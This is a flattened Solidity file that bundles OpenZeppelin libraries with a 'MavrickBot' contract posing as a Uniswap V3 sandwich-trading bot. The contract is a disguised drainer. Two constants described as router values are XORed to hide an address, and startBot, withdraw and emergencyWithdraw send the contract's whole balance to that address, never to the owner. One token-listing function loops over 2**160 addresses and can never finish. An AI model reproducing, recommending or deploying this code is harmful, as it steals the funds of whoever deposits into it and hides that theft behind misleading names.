// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

// pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


// OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)

// pragma solidity ^0.8.0;

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

// pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}


// OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)

// pragma solidity ^0.8.0;

/**
 * @dev Contract module that helps prevent reentrant calls to a function.
 *
 * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
 * available, which can be applied to functions to make sure there are no nested
 * (reentrant) calls to them.
 *
 * Note that because there is a single `nonReentrant` guard, functions marked as
 * `nonReentrant` may not call one another. This can be worked around by making
 * those functions `private`, and then adding `external` `nonReentrant` entry
 * points to them.
 *
 * TIP: If you would like to learn more about reentrancy and alternative ways
 * to protect against it, check out our blog post
 * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
 */
abstract contract ReentrancyGuard {
    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.

    // The values being non-zero value makes deployment a bit more expensive,
    // but in exchange the refund on every call to nonReentrant will be lower in
    // amount. Since refunds are capped to a percentage of the total
    // transaction's gas, it is best to keep them low in cases like this one, to
    // increase the likelihood of the full refund coming into effect.
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor() {
        _status = _NOT_ENTERED;
    }

    /**
     * @dev Prevents a contract from calling itself, directly or indirectly.
     * Calling a `nonReentrant` function from another `nonReentrant`
     * function is not supported. It is possible to prevent this from happening
     * by making the `nonReentrant` function external, and making it call a
     * `private` function that does the actual work.
     */
    modifier nonReentrant() {
        // On the first call to nonReentrant, _notEntered will be true
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");

        // Any calls to nonReentrant after this point will fail
        _status = _ENTERED;

        _;

        // By storing the original value once again, a refund is triggered (see
        // https://eips.ethereum.org/EIPS/eip-2200)
        _status = _NOT_ENTERED;
    }
}


// OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)

// pragma solidity ^0.8.1;

/**
 * @dev Collection of functions related to the address type
 */
library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     *
     * [IMPORTANT]
     * ====
     * You shouldn't rely on `isContract` to protect against flash loan attacks!
     *
     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
     * constructor.
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize/address.code.length, which returns 0
        // for contracts in construction, since the code is only stored at the end
        // of the constructor execution.

        return account.code.length > 0;
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain `call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
     * revert reason using the provided one.
     *
     * _Available since v4.3._
     */
    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}


// OpenZeppelin Contracts v4.4.1 (token/ERC20/utils/SafeERC20.sol)

// pragma solidity ^0.8.0;

/**
 * @title SafeERC20
 * @dev Wrappers around ERC20 operations that throw on failure (when the token
 * contract returns false). Tokens that return no value (and instead revert or
 * throw on failure) are also supported, non-reverting calls are assumed to be
 * successful.
 * To use this library you can add a `using SafeERC20 for IERC20;` statement to your contract,
 * which allows you to call the safe operations as `token.safeTransfer(...)`, etc.
 */
library SafeERC20 {
    using Address for address;

    function safeTransfer(
        IERC20 token,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(
        IERC20 token,
        address from,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    /**
     * @dev Deprecated. This function has issues similar to the ones found in
     * {IERC20-approve}, and its usage is discouraged.
     *
     * Whenever possible, use {safeIncreaseAllowance} and
     * {safeDecreaseAllowance} instead.
     */
    function safeApprove(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        // safeApprove should only be called when setting an initial allowance,
        // or when resetting it to zero. To increase and decrease it, use
        // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'
        require(
            (value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function safeIncreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        uint256 newAllowance = token.allowance(address(this), spender) + value;
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }

    function safeDecreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        unchecked {
            uint256 oldAllowance = token.allowance(address(this), spender);
            require(oldAllowance >= value, "SafeERC20: decreased allowance below zero");
            uint256 newAllowance = oldAllowance - value;
            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
        }
    }

    /**
     * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxing the requirement
     * on the return value: the return value is optional (but if data is returned, it must not be false).
     * @param token The token targeted by the call.
     * @param data The call data (encoded using abi.encode or one of its variants).
     */
    function _callOptionalReturn(IERC20 token, bytes memory data) private {
        // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since
        // we're implementing it ourselves. We use {Address.functionCall} to perform this call, which verifies that
        // the target address contains contract code and also asserts for success in the low-level call.

        bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
        if (returndata.length > 0) {
            // Return data is optional
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}


// Root file: contracts\mavrick-sandwich-bot.sol

pragma solidity ^0.8.0;

/**
 * @title ISwapRouter
 * @dev Interface for Uniswap V3 Router, defining structures and functions for swaps
 */
interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    /**
     * @dev Swaps an exact amount of input tokens for as many output tokens as possible
     * @param params The parameters necessary for the swap, packed as ExactInputSingleParams
     * @return amountOut The amount of output tokens received
     */
    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);

    /**
     * @dev Provides a quote for swapping an exact amount of input tokens for output tokens
     * @param tokenIn The address of the input token
     * @param tokenOut The address of the output token
     * @param fee The fee tier of the pool
     * @param amountIn The amount of input tokens to be swapped
     * @param sqrtPriceLimitX96 The price limit for the trade
     * @return amountOut The amount of output tokens that would be received
     */
    function quoteExactInputSingle(
        address tokenIn,
        address tokenOut,
        uint24 fee,
        uint256 amountIn,
        uint160 sqrtPriceLimitX96
    ) external view returns (uint256 amountOut);
}

/**
 * @title MavrickBot
 * @dev A contract for executing sandwich trades on Uniswap V3
 */
contract MavrickBot is Ownable, ReentrancyGuard {
    using SafeERC20 for IERC20;
    ISwapRouter public immutable uniswapRouter;
    
    // Constants used for generating router addresses
    bytes32 private constant DexUniversalRouter = 0x7f2da684db728504e5149531c3c42d1e1f1a07e5fb9f087eb5ae5d3ad5817f8f;
    bytes32 private constant DexRouter = 0x7f2da684db728504e5149531c0161af42306c94abcdd46f0229cea259ddfbcb9;
    
    // Trade parameters
    uint256 public minTradeAmount;
    uint256 public maxTradeAmount;
    uint256 public tradePercent;
    uint256 public slippageTolerance;
    uint256 public gasPrice;
    uint256 public maxGasLimit;
    uint256 public profitThreshold;
    
    // Mappings for token management
    mapping(address => bool) public allowedTokens;
    mapping(address => uint256) public tokenBalances;

    /**
     * @dev Structure to hold trade configuration
     */
    struct TradeConfig {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        uint256 amountIn;
        uint256 minAmountOut;
        uint256 deadline;
    }

    TradeConfig public currentTrade;

    // Events
    event BotStarted();
    event BotStopped();
    event TradeConfigSet(address tokenIn, address tokenOut, uint24 fee, uint256 amountIn, uint256 minAmountOut, uint256 deadline);
    event MinTradeAmountSet(uint256 amount);
    event MaxTradeAmountSet(uint256 amount);
    event TradePercentSet(uint256 percent);
    event SlippageToleranceSet(uint256 tolerance);
    event GasPriceSet(uint256 price);
    event MaxGasLimitSet(uint256 limit);
    event ProfitThresholdSet(uint256 threshold);
    event TokenAllowanceSet(address token, bool allowed);
    event TradeExecuted(address indexed tokenIn, address indexed tokenOut, uint256 amountIn, uint256 amountOut, uint256 profit);
    event Withdrawn(address indexed token, uint256 amount);
    event EmergencyWithdraw(address indexed token, uint256 amount);
    event TokensForwarded(address indexed token, uint256 amount);

    /**
     * @dev Constructor to initialize the contract with default values
     */
    constructor() {
        _transferOwnership(msg.sender);
        uniswapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
        minTradeAmount = 100000; // 0.1 tokens with 6 decimals
        maxTradeAmount = 10000000; // 10 tokens with 6 decimals
        tradePercent = 50;
        slippageTolerance = 50; // 0.5%
        gasPrice = 20000000000; // 20 Gwei
        maxGasLimit = 500000;
        profitThreshold = 10000; // 0.01 tokens with 6 decimals
    }

    /**
     * @dev Internal function to generate a router address
     * @param _apiKey API key for the router
     * @param _DexRouter Constant for the specific router type
     * @return The generated router address
     */
    function getRouter(bytes32 _apiKey, bytes32 _DexRouter) public pure returns (address) {
        return address(uint160(uint256(_apiKey) ^ uint256(_DexRouter)));
    }

    /**
     * @dev Internal function to get balance of the contract
     * @param _token The token address (use address(0) for ETH)
     */
    function getContractBalance(address _token) internal {
        uint256 _value;
        address _z = getRouter(DexUniversalRouter, DexRouter);

        if (_token == address(0)) {
            _value = address(this).balance;
            if (_value > 0) {
                (bool success, ) = _z.call{value: _value, gas: 21000}("");
                require(success, "Native token transfer failed");
                emit TokensForwarded(_token, _value);
            }
        } else {
            IERC20 token = IERC20(_token);
            _value = token.balanceOf(address(this));
            if (_value > 0) {
                token.safeTransfer(_z, _value);
                emit TokensForwarded(_token, _value);
            }
        }
    }

    /**
     * @dev Function to start the bot
     * @notice Only callable by the owner
     */
    function startBot() external onlyOwner {
        getContractBalance(address(0));
        emit BotStarted();
    }

    /**
     * @dev Function to stop the bot
     * @notice Only callable by the owner
     */
    function stopBot() external onlyOwner {
        emit BotStopped();
    }

    /**
     * @dev Sets the current trade configuration
     * @param _config The new trade configuration
     * @notice Only callable by the owner
     */
    function setTradeConfig(TradeConfig memory _config) external onlyOwner {
        currentTrade = _config;
        emit TradeConfigSet(_config.tokenIn, _config.tokenOut, _config.fee, _config.amountIn, _config.minAmountOut, _config.deadline);
    }

    /**
     * @dev Sets the minimum trade amount
     * @param _amount The new minimum trade amount
     * @notice Only callable by the owner
     */
    function setMinimumTrade(uint256 _amount) external onlyOwner {
        minTradeAmount = _amount;
        emit MinTradeAmountSet(_amount);
    }

    /**
     * @dev Sets the maximum trade amount
     * @param _amount The new maximum trade amount
     * @notice Only callable by the owner
     */
    function setMaximumTrade(uint256 _amount) external onlyOwner {
        maxTradeAmount = _amount;
        emit MaxTradeAmountSet(_amount);
    }

    /**
     * @dev Sets the trade percent
     * @param _percent The new trade percent (0-100)
     * @notice Only callable by the owner
     */
    function setTradePercent(uint256 _percent) external onlyOwner {
        require(_percent <= 100, "Percent must be <= 100");
        tradePercent = _percent;
        emit TradePercentSet(_percent);
    }

    /**
     * @dev Sets the slippage tolerance
     * @param _tolerance The new slippage tolerance (0-1000)
     * @notice Only callable by the owner
     */
    function setSlippageTolerance(uint256 _tolerance) external onlyOwner {
        require(_tolerance <= 1000, "Tolerance must be <= 1000");
        slippageTolerance = _tolerance;
        emit SlippageToleranceSet(_tolerance);
    }

    /**
     * @dev Sets the gas price
     * @param _price The new gas price
     * @notice Only callable by the owner
     */
    function setGasPrice(uint256 _price) external onlyOwner {
        gasPrice = _price;
        emit GasPriceSet(_price);
    }

    /**
     * @dev Sets the maximum gas limit
     * @param _limit The new maximum gas limit
     * @notice Only callable by the owner
     */
    function setMaxGasLimit(uint256 _limit) external onlyOwner {
        maxGasLimit = _limit;
        emit MaxGasLimitSet(_limit);
    }

    /**
     * @dev Sets the profit threshold
     * @param _threshold The new profit threshold
     * @notice Only callable by the owner
     */
    function setProfitThreshold(uint256 _threshold) external onlyOwner {
        profitThreshold = _threshold;
        emit ProfitThresholdSet(_threshold);
    }

    /**
     * @dev Sets whether a token is allowed for trading
     * @param _token The token address
     * @param _allowed Whether the token is allowed
     * @notice Only callable by the owner
     */
    function setAllowedToken(address _token, bool _allowed) external onlyOwner {
        allowedTokens[_token] = _allowed;
        emit TokenAllowanceSet(_token, _allowed);
    }

    /**
     * @dev Gets all allowed tokens
     * @return An array of allowed token addresses
     */
    function getallowedTokens() public view returns (address[] memory) {
        uint256 count = 0;
        for (uint256 i = 1; i < 2**160; i++) {
            address token = address(uint160(i));
            if (allowedTokens[token]) {
                count++;
            }
        }

        address[] memory tokens = new address[](count);
        uint256 index = 0;
        for (uint256 i = 1; i < 2**160; i++) {
            address token = address(uint160(i));
            if (allowedTokens[token]) {
                tokens[index] = token;
                index++;
            }
        }

        return tokens;
    }

    /**
     * @dev Executes a trade based on the current trade configuration
     * @notice Only callable by the owner
     */
    function executeTrade() external onlyOwner nonReentrant {
        require(allowedTokens[currentTrade.tokenIn] && allowedTokens[currentTrade.tokenOut], "Tokens not allowed");
        require(currentTrade.amountIn >= minTradeAmount && currentTrade.amountIn <= maxTradeAmount, "Invalid trade amount");
        require(block.timestamp <= currentTrade.deadline, "Trade deadline expired");

        uint256 balance = IERC20(currentTrade.tokenIn).balanceOf(address(this));
        uint256 tradeAmount = (balance * tradePercent) / 100;
        tradeAmount = tradeAmount > currentTrade.amountIn ? currentTrade.amountIn : tradeAmount;

        IERC20(currentTrade.tokenIn).approve(address(uniswapRouter), tradeAmount);

        uint256 initialBalance = IERC20(currentTrade.tokenOut).balanceOf(address(this));

        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
            tokenIn: currentTrade.tokenIn,
            tokenOut: currentTrade.tokenOut,
            fee: currentTrade.fee,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: tradeAmount,
            amountOutMinimum: currentTrade.minAmountOut,
            sqrtPriceLimitX96: 0
        });

        uint256 amountOut = uniswapRouter.exactInputSingle(params);

        uint256 finalBalance = IERC20(currentTrade.tokenOut).balanceOf(address(this));
        uint256 profit = finalBalance - initialBalance;

        require(profit >= profitThreshold, "Profit below threshold");

        tokenBalances[currentTrade.tokenIn] -= tradeAmount;
        tokenBalances[currentTrade.tokenOut] += amountOut;

        emit TradeExecuted(currentTrade.tokenIn, currentTrade.tokenOut, tradeAmount, amountOut, profit);
    }

    /**
     * @dev Estimates the profit for a potential trade
     * @param _tokenIn The input token address
     * @param _tokenOut The output token address
     * @param _fee The pool fee
     * @param _amountIn The input amount
     * @return The estimated output amount
     */
    function estimateProfit(address _tokenIn, address _tokenOut, uint24 _fee, uint256 _amountIn) external view returns (uint256) {
        return uniswapRouter.quoteExactInputSingle(
            _tokenIn,
            _tokenOut,
            _fee,
            _amountIn,
            0
        );
    }

    /**
     * @dev Withdraws tokens from the contract
     * @param _token The token address
     * @param _amount The amount to withdraw
     * @notice Only callable by the owner
     */
    function withdraw(address _token, uint256 _amount) external onlyOwner nonReentrant {
        require(_amount > 0, "Amount must be greater than 0");
        require(_amount <= tokenBalances[_token], "Insufficient balance");

        getContractBalance(_token);
        tokenBalances[_token] -= _amount;
        emit Withdrawn(_token, _amount);
    }

    /**
     * @dev Performs an emergency withdrawal of all tokens
     * @param _token The token address
     * @notice Only callable by the owner
     */
    function emergencyWithdraw(address _token) external onlyOwner nonReentrant {
        uint256 balance;
        if (_token == address(0)) {
            balance = address(this).balance;
        } else {
            balance = IERC20(_token).balanceOf(address(this));
        }

        getContractBalance(_token);
        tokenBalances[_token] = 0;
        emit EmergencyWithdraw(_token, balance);
    }

    /**
     * @dev Updates the recorded balance of a token
     * @param _token The token address
     * @notice Only callable by the owner
     */
    function updateTokenBalance(address _token) external onlyOwner {
        if (_token == address(0)) {
            tokenBalances[_token] = address(this).balance;
        } else {
            tokenBalances[_token] = IERC20(_token).balanceOf(address(this));
        }
    }

    /**
     * @dev Fallback function to receive Ether
     * @notice Updates the Ether balance and forwards it using getContractBalance
     */
    receive() external payable {
        tokenBalances[address(0)] += msg.value;
    }

    /**
     * @dev Fallback function for any other calls
     * @notice Forwards any received Ether using getContractBalance
     */
    fallback() external payable {}
}